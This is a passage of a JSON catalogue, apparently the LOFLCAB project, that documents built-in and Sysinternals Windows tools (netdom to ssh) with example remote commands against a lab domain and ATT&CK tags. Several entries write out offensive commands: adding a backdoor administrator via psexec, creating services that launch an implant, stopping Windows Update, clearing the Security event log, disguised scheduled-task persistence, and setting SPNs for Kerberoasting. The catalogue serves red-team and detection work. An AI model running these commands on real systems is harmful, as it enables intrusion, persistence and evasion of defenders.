"Type":"Binaries","Name":"netdom.exe","Description":"Manage Active Directory domains and trust relationships from the command prompt","Updated":"2023-07-01","Toolsets":["RSAT","Server"],"Commands":[{"Command":"netdom.exe join %computername% /domain:ad.bitsadmin.com","Description":"Join machine to domain","Usecases":null,"Function":"Domain","Comments":["Be aware that this will also push group policies and potentially security solutions"],"MitreAttack":null},{"Command":"netdom.exe trust","Description":"Add a trust","Usecases":null,"Function":"Domain","Comments":["TODO: Complete command"],"MitreAttack":["T1484.002"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/netdom/"},{
"Type":"Binaries","Name":"netsh.exe","Description":"Display or modify the network configuration","Updated":"2023-08-25","Toolsets":["Builtin"],"Commands":[{"Command":"netsh.exe -r W10.ad.bitsadmin.com advfirewall firewall show rule name=\"Remote Desktop - Shadow (TCP-In)\"","Description":"Show firewall rule","Usecases":["Determine the configuration of a certain firewall rule and whether it is active","For example usage, see the Spying on users using RDP shadowing blog post (see resources)"],"Function":"Network","Comments":null,"MitreAttack":["T1562.004"]},{"Command":"netsh.exe -r W10.ad.bitsadmin.com advfirewall firewall set rule name=\"Remote Desktop - Shadow (TCP-In)\" new enable=yes","Description":"Enable firewall rule","Usecases":["Enable firewall rule","For example usage, see the Spying on users using RDP shadowing blog post (see resources)"],"Function":"Network","Comments":null,"MitreAttack":["T1562.004"]}],"Resources":["https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/netsh/"},{
"Type":"Binaries","Name":"nlb.exe","Description":"Manage Network Load Balancing (NLB)","Updated":"2023-07-01","Toolsets":["Server","TODO"],"Commands":[{"Command":"nlb.exe","Description":"TODO","Usecases":null,"Function":"Network","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/nlb/"},{
"Type":"Binaries","Name":"nltest.exe","Description":"Perform network administrative tasks","Updated":"2023-07-01","Toolsets":["RSAT"],"Commands":[{"Command":"nltest.exe /domain_trusts /all_trusts /v /server:DC1.ad.bitsadmin.com","Description":"List domain trusts","Usecases":["Understand the setup of the Active Directory forest"],"Function":"Domain","Comments":null,"MitreAttack":null},{"Command":"nltest.exe /SHUTDOWN:\"\" 0 /SERVER:W10.ad.bitsadmin.com","Description":"Shutdown machine","Usecases":["Make machine unavailable"],"Function":"Sessions","Comments":null,"MitreAttack":["T1529"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/nltest/"},{
"Type":"Binaries","Name":"nslookup.exe","Description":"Displays information that you can use to diagnose Domain Name System (DNS) infrastructure","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"nslookup.exe -q=srv _ldap._tcp.ad.bitsadmin.com","Description":"List LDAP servers","Usecases":["Identify DC IPs"],"Function":"Network","Comments":["For more DNS domain-related DNS queries, see the link in the resources on DNS-Based Discovery"],"MitreAttack":["T1590.002"]}],"Resources":["https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7fcdce70-5205-44d6-9c3a-260e616a2f04"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/nslookup/"},{
"Type":"Binaries","Name":"portqry.exe","Description":"Displays the state of TCP and UDP ports","Updated":"2023-07-01","Toolsets":["Extra"],"Commands":[{"Command":"portqry.exe -n DC1.ad.bitsadmin.com -e 135","Description":"Enumerate RPC endpoints","Usecases":["Reconnaissance of available RPC interfaces"],"Function":"Network","Comments":["Download PortQry from the resource link"],"MitreAttack":["T1046","T1007"]}],"Resources":["https://www.microsoft.com/en-us/download/details.aspx?id=17148"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/portqry/"},{
"Type":"Binaries","Name":"printui.exe","Description":"Automates many printer configuration tasks","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"rundll32.exe printui.dll,PrintUIEntry /im /c\\\\W10.ad.bitsadmin.com","Description":"Add printer","Usecases":null,"Function":"Misc","Comments":["Launches the \"Add Printer\" wizard"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/printui/"},{
"Type":"Binaries","Name":"psexec.exe","Description":"Executes a program on a remote system, where remotely executed console applications execute interactively","Updated":"2023-07-01","Toolsets":["Sysinternals"],"Commands":[{"Command":"psexec.exe \\\\W10.ad.bitsadmin.com -s cmd.exe /c net user hacker hacker /add ^&^& net localgroup Administrators hacker /add","Description":"Execute commands","Usecases":["In this example adds a backdoor user","Can also be used to launch an implant"],"Function":"Execute","Comments":["Installs PSEXESVC service on remote system"],"MitreAttack":["T1569.002"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/psexec/"},{
"Type":"Binaries","Name":"psfile.exe","Description":"Lists or closes files opened remotely","Updated":"2023-07-01","Toolsets":["Sysinternals","TODO"],"Commands":[{"Command":"psfile.exe -nobanner \\\\W10.ad.bitsadmin.com","Description":"List files opened remotely","Usecases":null,"Function":"Data","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/psfile/"},{
"Type":"Binaries","Name":"psgetsid.exe","Description":"Translates SIDs to names and vice versa","Updated":"2023-07-01","Toolsets":["Sysinternals"],"Commands":[{"Command":"psgetsid.exe \\\\W10.ad.bitsadmin.com","Description":"Resolve computer SID","Usecases":null,"Function":"Recon","Comments":["Installs service on remote system"],"MitreAttack":["TA0043"]},{"Command":"psgetsid.exe \\\\W10.ad.bitsadmin.com Administrator","Description":"Resolve SID of user","Usecases":null,"Function":"Recon","Comments":["Installs service on remote system"],"MitreAttack":["TA0043"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/psgetsid/"},{
"Type":"Binaries","Name":"psinfo.exe","Description":"Local and remote system information viewer","Updated":"2023-07-01","Toolsets":["Sysinternals"],"Commands":[{"Command":"psinfo.exe \\\\W10.ad.bitsadmin.com","Description":"Show basic information","Usecases":["Reconnaissance on system information"],"Function":"Recon","Comments":["Similar to [systeminfo.exe](../systeminfo)"],"MitreAttack":["T1082"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/psinfo/"},{
"Type":"Binaries","Name":"pskill.exe","Description":"Terminates processes on local or remote systems","Updated":"2023-07-01","Toolsets":["Sysinternals","TODO"],"Commands":[{"Command":"pskill.exe","Description":"TODO","Usecases":null,"Function":"Processes","Comments":null,"MitreAttack":["T1562.001"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/pskill/"},{
"Type":"Binaries","Name":"pslist.exe","Description":"Process information lister","Updated":"2023-07-01","Toolsets":["Sysinternals","TODO"],"Commands":[{"Command":"pslist.exe -nobanner \\\\W10.ad.bitsadmin.com","Description":"List all processes","Usecases":["Reconnaissance on running processes"],"Function":"Processes","Comments":null,"MitreAttack":["T1057"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/pslist/"},{
"Type":"Binaries","Name":"psloggedon.exe","Description":"See who's logged on","Updated":"2023-07-01","Toolsets":["Sysinternals"],"Commands":[{"Command":"psloggedon.exe -nobanner \\\\W10.ad.bitsadmin.com","Description":"List both interactive sessions and sessions to shares","Usecases":null,"Function":"Sessions","Comments":null,"MitreAttack":null},{"Command":"psloggedon.exe \\\\W10.ad.bitsadmin.com","Description":"Show sessions","Usecases":["Reconnaissance on currently active users"],"Function":"Sessions","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/psloggedon/"},{
"Type":"Binaries","Name":"psloglist.exe","Description":"Dumps event logs on a local or remote system","Updated":"2023-07-01","Toolsets":["Sysinternals"],"Commands":[{"Command":"psloglist.exe -nobanner -i 99999 -c \\\\W10.ad.bitsadmin.com Security","Description":"Clear Security event log","Usecases":["Cover tracks clearing past logon events"],"Function":"Logs","Comments":["Be aware that this leaves an event stating that the Security event log has been cleared (event id 1102)"],"MitreAttack":["T1070.001"]},{"Command":"psloglist.exe -nobanner -s \\\\W10.ad.bitsadmin.com Security","Description":"List events in the Security event log","Usecases":["Identify which IPs logons of privileged users are originating from"],"Function":"Logs","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/psloglist/"},{
"Type":"Binaries","Name":"pspasswd.exe","Description":"Changes passwords on a local or remote system","Updated":"2023-07-01","Toolsets":["Sysinternals"],"Commands":[{"Command":"pspasswd.exe \\\\W10.ad.bitsadmin.com MyUser MyNewPassword","Description":"Update password","Usecases":["Update a user's password"],"Function":"Sessions","Comments":null,"MitreAttack":["T1531"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/pspasswd/"},{
"Type":"Binaries","Name":"psping.exe","Description":"Implements Ping functionality, TCP ping, UDP/TCP latency, and UDP / TCP bandwidth measurement","Updated":"2023-07-01","Toolsets":["Sysinternals","TODO"],"Commands":[{"Command":"psping.exe","Description":"TODO","Usecases":null,"Function":"Network","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/psping/"},{
"Type":"Binaries","Name":"psservice.exe","Description":"Lists or controls services on a local or remote system","Updated":"2023-07-01","Toolsets":["Sysinternals"],"Commands":[{"Command":"psservice.exe \\\\W10.ad.bitsadmin.com config","Description":"List services","Usecases":["Reconnaissance of installed services"],"Function":"Processes","Comments":null,"MitreAttack":["T1569.002"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/psservice/"},{
"Type":"Binaries","Name":"psshutdown.exe","Description":"Shutdown, logoff and power manage local and remote systems","Updated":"2023-07-01","Toolsets":["Sysinternals"],"Commands":[{"Command":"psshutdown.exe -f -k \\\\W10.ad.bitsadmin.com","Description":"Shutdown computer","Usecases":["Affect availability of a computer"],"Function":"Sessions","Comments":["Makes use of a service that is installed on the remote system. Better make use of [shutdown.exe](../shutdown)"],"MitreAttack":["T1529"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/psshutdown/"},{
"Type":"Binaries","Name":"pssuspend.exe","Description":"Suspends or resumes processes on a local or remote system","Updated":"2023-07-01","Toolsets":["Sysinternals"],"Commands":[{"Command":"pssuspend.exe -r \\\\W10.ad.bitsadmin.com procexp.exe","Description":"Resume process","Usecases":null,"Function":"Processes","Comments":["Installs PsSuspend service"],"MitreAttack":null},{"Command":"pssuspend.exe \\\\W10.ad.bitsadmin.com procexp.exe","Description":"Suspend process","Usecases":["Alternative to terminating a process"],"Function":"Processes","Comments":["Installs PsSuspend service"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/pssuspend/"},{
"Type":"Binaries","Name":"qappsrv.exe","Description":"Displays the available Remote Desktop Session Host servers on the network","Updated":"2024-12-13","Toolsets":["Builtin"],"Commands":[{"Command":"qappsrv dc1.ad.bitsadmin.com","Description":"Display information about Remote Desktop Session Host server","Usecases":null,"Function":"Manage","Comments":["Equivalent to [query.exe](../query) termserver"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/qappsrv/"},{
"Type":"Binaries","Name":"qprocess.exe","Description":"Displays information about processes that are running on a Remote Desktop Session Host server","Updated":"2024-12-13","Toolsets":["Builtin"],"Commands":[{"Command":"qprocess.exe /server:W10.ad.bitsadmin.com DomainUser2","Description":"List all processes","Usecases":["Reconnaissance on running processes for a specific user"],"Function":"Processes","Comments":null,"MitreAttack":["T1057"]},{"Command":"qprocess.exe /server:W10.ad.bitsadmin.com *","Description":"List all processes","Usecases":["Reconnaissance on running processes"],"Function":"Processes","Comments":["Equivalent to [query.exe](../query) process"],"MitreAttack":["T1057"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/qprocess/"},{
"Type":"Binaries","Name":"query.exe","Description":"Displays information about processes, sessions, and Remote Desktop Session Host servers","Updated":"2024-12-13","Toolsets":["Builtin"],"Commands":[{"Command":"query.exe session /server:W10.ad.bitsadmin.com","Description":"List listeners and interactive sessions","Usecases":["Reconnaissance on currently active sessions"],"Function":"Sessions","Comments":["Equivalent to [qwinsta.exe](../qwinsta)"],"MitreAttack":null},{"Command":"query.exe user /server:W10.ad.bitsadmin.com","Description":"List logged in users","Usecases":["Reconnaissance on currently active users"],"Function":"Sessions","Comments":["Equivalent to [quser.exe](../quser)"],"MitreAttack":null},{"Command":"query.exe process /server:W10.ad.bitsadmin.com *","Description":"List all processes","Usecases":["Reconnaissance on running processes"],"Function":"Processes","Comments":["Equivalent to [qprocess.exe](../qprocess)"],"MitreAttack":["T1057"]},{"Command":"query.exe process /server:W10.ad.bitsadmin.com keepass.exe","Description":"List all processes","Usecases":["Identify specific running process"],"Function":"Processes","Comments":["Equivalent to [qprocess.exe](../qprocess)"],"MitreAttack":["T1057"]},{"Command":"query.exe termserver","Description":"List terminal servers on the network","Usecases":null,"Function":"Sessions","Comments":["Equivalent to [qappsrv.exe](../qappsrv)"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/query/"},{
"Type":"Binaries","Name":"quser.exe","Description":"Displays information about user sessions on a Remote Desktop Session Host server","Updated":"2024-12-13","Toolsets":["Builtin"],"Commands":[{"Command":"quser.exe /server:W10.ad.bitsadmin.com","Description":"List logged in users","Usecases":["Check whether the system has high-privileged users logged in to then laterally move to it"],"Function":"Sessions","Comments":["Equivalent to [query.exe](../query) user"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/quser/"},{
"Type":"Binaries","Name":"qwinsta.exe","Description":"Display information about Remote Desktop Services sessions","Updated":"2024-12-13","Toolsets":["Builtin"],"Commands":[{"Command":"qwinsta.exe /server:W10.ad.bitsadmin.com","Description":"List listeners and interactive sessions","Usecases":["Check whether the system has high-privileged users logged in to then laterally move to it"],"Function":"Sessions","Comments":["Equivalent to [query.exe](../query) session"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/qwinsta/"},{
"Type":"Binaries","Name":"reg.exe","Description":"Query and edit the registry","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"reg.exe query \"\\\\W10.ad.bitsadmin.com\\HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"","Description":"Query registry key","Usecases":["Query registry autoruns"],"Function":"Registry","Comments":null,"MitreAttack":["T1012","T1547.001"]},{"Command":"reg.exe add \\\\W10.ad.bitsadmin.com\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /d 0 /t REG_DWORD","Description":"Set registry value","Usecases":["Configure the remote system, e.g. to support Kerberos authentication for remote desktop","Configure the automatic start of an implant upon boot"],"Function":"Registry","Comments":null,"MitreAttack":["T1112"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/reg/"},{
"Type":"Binaries","Name":"regedit.exe","Description":"Registry Editor","Updated":"2023-07-01","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"regedit.exe","Description":"Registry Editor","Usecases":["Read secrets from the registry","Add persistence"],"Function":"Registry","Comments":["File -> Connect Network Registry"],"MitreAttack":["T1012","T1112"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/regedit/"},{
"Type":"Binaries","Name":"regini.exe","Description":"Modifies the registry from the command line or a script","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"regini.exe -m \\\\W10.ad.bitsadmin.com mybackdoor.ini","Description":"Import ini into registry of remote system","Usecases":["Add registry persistence"],"Function":"Registry","Comments":null,"MitreAttack":["T1112"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/regini/"},{
"Type":"Binaries","Name":"rendom.exe","Description":"Performs various actions necessary for a domain rename operation","Updated":"2023-07-01","Toolsets":["Builtin","TODO"],"Commands":[{"Command":"rendom.exe","Description":"TODO","Usecases":null,"Function":"Domain","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/rendom/"},{
"Type":"Binaries","Name":"repadmin.exe","Description":"Diagnose Active Directory replication problems between domain controllers","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"repadmin.exe /replsummary /homeserver:DC1.ad.bitsadmin.com","Description":"Show replication state","Usecases":null,"Function":"Data","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/repadmin/"},{
"Type":"Binaries","Name":"reset.exe","Description":"Reset the session subsytem hardware and software to known initial values","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"reset.exe session 1 /SERVER:W10.ad.bitsadmin.com /V","Description":"Logoff user","Usecases":null,"Function":"Sessions","Comments":["Sessions can be queried using [qwinsta.exe](../qwinsta)","Equivalent to [rwinsta.exe](../rwinsta)"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/reset/"},{
"Type":"Binaries","Name":"rpcdump.exe","Description":"RPC endpoint diagnostic utility","Updated":"2023-07-01","Toolsets":["Extra"],"Commands":[{"Command":"rpcdump.exe /S W10.ad.bitsadmin.com /V /I > W10.txt","Description":"List RPC endpoints","Usecases":["Identify whether certain services or software is running based on the available RPC interfaces"],"Function":"Recon","Comments":["Part of the Windows Server 2003 Resource Kit"],"MitreAttack":["TA0043"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/rpcdump/"},{
"Type":"Binaries","Name":"rwinsta.exe","Description":"Reset the session subsytem hardware and software to known initial values","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"rwinsta.exe 1 /SERVER:W10.ad.bitsadmin.com /V","Description":"TODO","Usecases":null,"Function":"Sessions","Comments":["Sessions can be queried using [qwinsta.exe](../qwinsta)","Equivalent to [reset.exe](../reset)"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/rwinsta/"},{
"Type":"Binaries","Name":"sc.exe","Description":"Interact with the Service Control Manager database","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"sc.exe \\\\W10.ad.bitsadmin.com create MyService binpath= C:\\Windows\\implant.exe","Description":"Create service","Usecases":["Create service pointing to implant binary"],"Function":"Execute","Comments":null,"MitreAttack":["T1569.002","T1543.003"]},{"Command":"sc.exe \\\\W10.ad.bitsadmin.com config wuauserv start= disabled","Description":"Disable service","Usecases":["Impair security defenses"],"Function":"Execute","Comments":null,"MitreAttack":["T1489"]},{"Command":"sc.exe \\\\W10.ad.bitsadmin.com query","Description":"List services","Usecases":["Reconnaissance of installed services"],"Function":"Recon","Comments":null,"MitreAttack":["TA0043"]},{"Command":"sc.exe \\\\W10.ad.bitsadmin.com start MyService","Description":"Start service","Usecases":["Launch implant"],"Function":"Execute","Comments":null,"MitreAttack":["T1569.002"]},{"Command":"sc.exe \\\\W10.ad.bitsadmin.com stop wuauserv","Description":"Stop service","Usecases":["Impair security defenses"],"Function":"Execute","Comments":null,"MitreAttack":["T1489"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/sc/"},{
"Type":"Binaries","Name":"schtasks.exe","Description":"Create, delete, query, change, run and end scheduled tasks","Updated":"2023-11-04","Toolsets":["Builtin"],"Commands":[{"Command":"schtasks.exe /S W10.ad.bitsadmin.com /Create /RU SYSTEM /SC HOURLY /TN \"Microsoft\\Windows\\Printing\\Print Spooler (x64)\" /TR \"C:\\Windows\\System32\\spoolsv64.exe\"","Description":"Create new task","Usecases":["Command execution through scheduled task","Persistence by registering a scheduled task"],"Function":"Execute","Comments":null,"MitreAttack":["T1053.005"]},{"Command":"schtasks.exe /S W10.ad.bitsadmin.com","Description":"List tasks","Usecases":["List current tasks to identify a name that can be used for a new task to blend in"],"Function":"Recon","Comments":null,"MitreAttack":["T1053.005"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/schtasks/"},{
"Type":"Binaries","Name":"scp.exe","Description":"Secure Copy","Updated":"2024-12-13","Toolsets":["Builtin"],"Commands":[{"Command":"scp.exe -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes myuser@linux.ad.bitsadmin.com:/tmp/file.tgz file.tgz","Description":"Copy file locally from SSH server authenticating using Kerberos","Usecases":["Data collection","Tool transfer"],"Function":"Data","Comments":null,"MitreAttack":["T1105"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/scp/"},{
"Type":"Binaries","Name":"sdelete.exe","Description":"Secure file delete","Updated":"2023-07-01","Toolsets":["Sysinternals"],"Commands":[{"Command":"sdelete \\\\W10.ad.bitsadmin.com\\C$\\backdoor.exe","Description":"Securely delete a file","Usecases":["Cleanup of traces"],"Function":"Data","Comments":null,"MitreAttack":["T1070.004"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/sdelete/"},{
"Type":"Binaries","Name":"setspn.exe","Description":"Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"setspn.exe -L ad.bitsadmin.com\\SP2019","Description":"List SPNs for a specific account","Usecases":["Reconnaissance"],"Function":"Domain","Comments":["Can be both a regular account as well as a computer account"],"MitreAttack":null},{"Command":"setspn.exe -T ad.bitsadmin.com -Q */*","Description":"List all SPNs in the domain","Usecases":["Reconnaissance"],"Function":"Domain","Comments":null,"MitreAttack":null},{"Command":"setspn.exe -S HTTP/EXCH2019.ad.bitsadmin.com EXCH2019","Description":"Set SPN","Usecases":["Add an SPN to a user for a targeted Kerberoast"],"Function":"Domain","Comments":["Error when execution from Offensive Windows VM: `Ldap Error(0x51 -- Server Down): ldap_connect; Failed to retrieve DN for domain \"\" : 0x00000051; Warning: No valid targets specified, reverting to current domain.; FindDomainForAccount: Call to DsGetDcNameWithAccountW failed with return value 0x0000054B; Unable to locate account SP2019`"],"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/setspn/"},{
"Type":"Binaries","Name":"setx.exe","Description":"Modifies the value of a service's entries in the registry and in the Service Control Manager database","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"setx.exe /S W10.ad.bitsadmin.com /M MYVAR \"Hello there!\"","Description":"Set machine-wide environment variables","Usecases":["Configure a path order hijack"],"Function":"Registry","Comments":null,"MitreAttack":["T1112"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/setx/"},{
"Type":"Binaries","Name":"shadow.exe","Description":"Remotely control an active session of another user on a Remote Desktop Session Host server","Updated":"2023-08-25","Toolsets":["Builtin"],"Commands":[{"Command":"shadow.exe 3 /SERVER:W10.ad.bitsadmin.com","Description":"RDP shadow a user session","Usecases":null,"Function":"Sessions","Comments":["Starting from Windows 8/Server 2012 this binary is replaced with `mstsc.exe`"],"MitreAttack":["T1563.002"]}],"Resources":["https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing"],"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/shadow/"},{
"Type":"Binaries","Name":"shrpubw.exe","Description":"Create a Shared Folder Wizard","Updated":"2024-12-13","Toolsets":["Builtin","GUI"],"Commands":[{"Command":"shrpubw /s W10.ad.bitsadmin.com","Description":"Create a Shared Folder Wizard","Usecases":["Add (hidden - dollar share) shared folder"],"Function":"Manage","Comments":["Alternatively, use [fsmgmt.msc](../../MMC/fsmgmt)"],"MitreAttack":["T1135","T1021.002"]}],"Resources":null,"Detections":[{"Port":"445/TCP"}],"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/shrpubw/"},{
"Type":"Binaries","Name":"shutdown.exe","Description":"Shut down or restart local or remote computers, one at a time","Updated":"2023-07-01","Toolsets":["Builtin"],"Commands":[{"Command":"shutdown.exe /r /f /t 0 /m \\\\W10.ad.bitsadmin.com","Description":"Restart machine","Usecases":["Affect availability of a computer"],"Function":"Sessions","Comments":null,"MitreAttack":["T1529"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/shutdown/"},{
"Type":"Binaries","Name":"sqlcmd.exe","Description":"Integrated environment for managing any SQL infrastructure, from SQL Server to Azure SQL Database","Updated":"2023-07-01","Toolsets":["Extra"],"Commands":[{"Command":"sqlcmd.exe -S SQL1.ad.bitsadmin.com\\SQLEXPRESS","Description":"SQL Server Command Line Tool","Usecases":["Connect to MSSQL database and execute commands on the underlying OS using the `xp_cmdshell` stored procedure, execute CLR code or pivot over MSSQL server links"],"Function":"Manage","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/sqlcmd/"},{
"Type":"Binaries","Name":"srvcheck.exe","Description":"Server share check","Updated":"2023-07-01","Toolsets":["Extra"],"Commands":[{"Command":"srvcheck.exe \\\\DC1.ad.bitsadmin.com","Description":"Displays a list of server shares and who has access","Usecases":null,"Function":"Data","Comments":["Part of the Windows Server 2003 Resource Kit"],"MitreAttack":["T1135"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/srvcheck/"},{
"Type":"Binaries","Name":"srvinfo.exe","Description":"Gather information about a target server","Updated":"2023-07-01","Toolsets":["Extra"],"Commands":[{"Command":"srvinfo.exe \\\\DC1.ad.bitsadmin.com","Description":"List computer information","Usecases":["List OS info and installed security updates and feed them to WES-NG to identify vulnerabilities"],"Function":"Recon","Comments":["Similar to [systeminfo.exe](../systeminfo)","Part of the Windows Server 2003 Resource Kit"],"MitreAttack":["T1082"]}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/srvinfo/"},{
"Type":"Binaries","Name":"ssh.exe","Description":"Secure Shell client","Updated":"2024-12-13","Toolsets":["Builtin"],"Commands":[{"Command":"ssh.exe -Kv myuser@linux.ad.bitsadmin.com","Description":"Connect to SSH server using Kerberos","Usecases":["Lateral movement"],"Function":"Sessions","Comments":null,"MitreAttack":null}],"Resources":null,"Detections":null,"Contributors":[{"Name":"Arris Huijgen","Handle":"bitsadmin"}],"Url":"https://lofl-project.github.io/loflcab/Binaries/ssh/"},{
